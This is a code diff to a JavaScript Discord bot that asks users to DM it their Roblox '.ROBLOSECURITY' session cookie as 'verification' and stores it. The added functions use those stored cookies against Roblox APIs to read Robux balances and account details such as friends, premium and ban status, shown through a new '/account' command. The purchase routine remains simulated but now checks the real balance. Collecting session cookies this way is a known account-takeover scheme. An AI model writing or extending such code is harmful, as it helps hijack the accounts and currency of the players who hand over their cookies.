@@ -130,14 +130,40 @@ async function validateRobloxCookie(cookie) {
   }
 }
 
-// Enhanced purchase function (placeholder)
+// New function to get Robux balance
+async function getRobuxBalance(cookie, userId) {
+  try {
+    const response = await robloxAPI.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+      },
+    });
+    
+    return {
+      success: true,
+      robux: response.data.robux || 0
+    };
+  } catch (error) {
+    console.error('Failed to get Robux balance:', error.message);
+    return {
+      success: false,
+      error: error.response?.data?.errors?.[0]?.message || 'Failed to fetch Robux balance'
+    };
+  }
+}
+
+// Enhanced purchase function with Robux check
 async function buyRandomItem(cookie, userInfo) {
   try {
-    // This is where you'd implement actual Roblox marketplace logic
-    // For now, simulate a purchase with validation
+    // First check Robux balance
+    const balanceResponse = await getRobuxBalance(cookie, userInfo.UserID);
     
-    // Simulate checking Robux balance
-    await new Promise(resolve => setTimeout(resolve, 500));
+    if (!balanceResponse.success) {
+      return {
+        success: false,
+        message: `❌ Failed to check Robux balance: ${balanceResponse.error}`
+      };
+    }
     
     const items = [
       { name: "Cool Hat", price: 100 },
@@ -148,17 +174,81 @@ async function buyRandomItem(cookie, userInfo) {
     
     const randomItem = items[Math.floor(Math.random() * items.length)];
     
+    // Check if user has enough Robux
+    if (balanceResponse.robux < randomItem.price) {
+      return {
+        success: false,
+        message: `❌ Insufficient Robux! You need ${randomItem.price} but only have ${balanceResponse.robux}.`,
+        item: randomItem,
+        userInfo
+      };
+    }
+    
+    // Simulate purchase
+    await new Promise(resolve => setTimeout(resolve, 500));
+    
     return {
       success: true,
       message: `🎉 Successfully purchased **${randomItem.name}** for ${randomItem.price} Robux!`,
       item: randomItem,
-      userInfo
+      userInfo,
+      remainingRobux: balanceResponse.robux - randomItem.price
     };
     
   } catch (error) {
     return {
       success: false,
       message: `❌ Failed to purchase item: ${error.message}`
+    };
+  }
+}
+
+// New function to get full account details
+async function getAccountDetails(cookie, userId) {
+  try {
+    // Get basic user info
+    const userResponse = await robloxAPI.get(`https://users.roblox.com/v1/users/${userId}`, {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+      },
+    });
+    
+    // Get Robux balance
+    const robuxResponse = await getRobuxBalance(cookie, userId);
+    
+    // Get friends count
+    const friendsResponse = await robloxAPI.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+      },
+    });
+    
+    // Get premium status
+    const premiumResponse = await robloxAPI.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+      },
+    });
+    
+    return {
+      success: true,
+      data: {
+        username: userResponse.data.name,
+        displayName: userResponse.data.displayName,
+        userId: userResponse.data.id,
+        created: new Date(userResponse.data.created).toLocaleDateString(),
+        isBanned: userResponse.data.isBanned,
+        hasVerifiedBadge: userResponse.data.hasVerifiedBadge,
+        robux: robuxResponse.success ? robuxResponse.robux : 'Unknown',
+        friendsCount: friendsResponse.data.count,
+        isPremium: premiumResponse.data.hasMembership
+      }
+    };
+  } catch (error) {
+    console.error('Failed to get account details:', error.message);
+    return {
+      success: false,
+      error: error.response?.data?.errors?.[0]?.message || 'Failed to fetch account details'
     };
   }
 }
@@ -213,6 +303,9 @@ client.once('ready', async () => {
     new SlashCommandBuilder()
       .setName('resubmit')
       .setDescription('Get instructions to resubmit your Roblox cookie'),
+    new SlashCommandBuilder()
+      .setName('account')
+      .setDescription('View all available information about your Roblox account')
   ].map(cmd => cmd.toJSON());
 
   try {
@@ -342,6 +435,10 @@ client.on('interactionCreate', async (interaction) => {
         await handleResubmitCommand(interaction, userId);
         break;
         
+      case 'account':
+        await handleAccountCommand(interaction, userId);
+        break;
+        
       default:
         await interaction.editReply('❌ Unknown command.');
     }
@@ -421,7 +518,8 @@ async function handleTestCommand(interaction, userId) {
     resultEmbed.addFields(
       { name: 'Item', value: purchaseResult.item.name, inline: true },
       { name: 'Price', value: `${purchaseResult.item.price} Robux`, inline: true },
-      { name: 'Account', value: validation.data.UserName, inline: true }
+      { name: 'Account', value: validation.data.UserName, inline: true },
+      { name: 'Remaining Robux', value: `${purchaseResult.remainingRobux}`, inline: true }
     );
   }
 
@@ -463,6 +561,90 @@ async function handleResubmitCommand(interaction, userId) {
     .setFooter({ text: 'Need detailed help? Use /cookiehelp in the server!' });
 
   await interaction.editReply({ embeds: [embed] });
+}
+
+// New function to handle account details command
+async function handleAccountCommand(interaction, userId) {
+  if (!verifiedUsers.has(userId)) {
+    const embed = new EmbedBuilder()
+      .setColor('#ff6b6b')
+      .setTitle('🔒 Verification Required')
+      .setDescription('You must submit your Roblox cookie first to view account details!')
+      .addFields(
+        { name: 'How to verify:', value: 'Send me a DM with your `.ROBLOSECURITY` cookie', inline: false }
+      );
+
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  const cookie = userCookies.get(userId);
+  if (!cookie) {
+    const embed = new EmbedBuilder()
+      .setColor('#ff9f43')
+      .setTitle('⚠️ Cookie Missing')
+      .setDescription('Your Roblox cookie is missing from our records.')
+      .addFields(
+        { name: 'Solution:', value: 'Please resubmit your cookie via DM', inline: false }
+      );
+
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  // Re-validate cookie
+  const validation = await validateRobloxCookie(cookie);
+  if (!validation.valid) {
+    // Remove invalid data
+    verifiedUsers.delete(userId);
+    userCookies.delete(userId);
+    saveData();
+
+    const embed = new EmbedBuilder()
+      .setColor('#ff6b6b')
+      .setTitle('❌ Cookie Expired')
+      .setDescription('Your Roblox cookie appears to be invalid or expired.')
+      .addFields(
+        { name: 'What happened:', value: validation.error, inline: false },
+        { name: 'Solution:', value: 'Please submit a new valid cookie via DM', inline: false }
+      );
+
+    await interaction.editReply({ embeds: [embed] });
+    return;
+  }
+
+  // Get account details
+  await interaction.editReply({ content: '⏳ Gathering account details...', ephemeral: true });
+  
+  const details = await getAccountDetails(cookie, validation.data.UserID);
+  
+  if (!details.success) {
+    await interaction.editReply({
+      content: `❌ Failed to get account details: ${details.error}`,
+      ephemeral: true
+    });
+    return;
+  }
+
+  const embed = new EmbedBuilder()
+    .setColor('#0099ff')
+    .setTitle(`🔍 Account Details for ${details.data.username}`)
+    .setThumbnail(`https://www.roblox.com/headshot-thumbnail/image?userId=${validation.data.UserID}&width=420&height=420&format=png`)
+    .addFields(
+      { name: '👤 Username', value: details.data.username, inline: true },
+      { name: '🏷️ Display Name', value: details.data.displayName || 'None', inline: true },
+      { name: '🆔 User ID', value: details.data.userId.toString(), inline: true },
+      { name: '📅 Created', value: details.data.created, inline: true },
+      { name: '💰 Robux', value: details.data.robux.toString(), inline: true },
+      { name: '👥 Friends', value: details.data.friendsCount.toString(), inline: true },
+      { name: '⭐ Premium', value: details.data.isPremium ? '✅ Yes' : '❌ No', inline: true },
+      { name: '✅ Verified Badge', value: details.data.hasVerifiedBadge ? '✅ Yes' : '❌ No', inline: true },
+      { name: '🚫 Banned', value: details.data.isBanned ? '⚠️ Yes' : '✅ No', inline: true }
+    )
+    .setFooter({ text: 'Account details fetched from Roblox' })
+    .setTimestamp();
+
+  await interaction.editReply({ embeds: [embed], ephemeral: true });
 }
 
 // Graceful shutdown
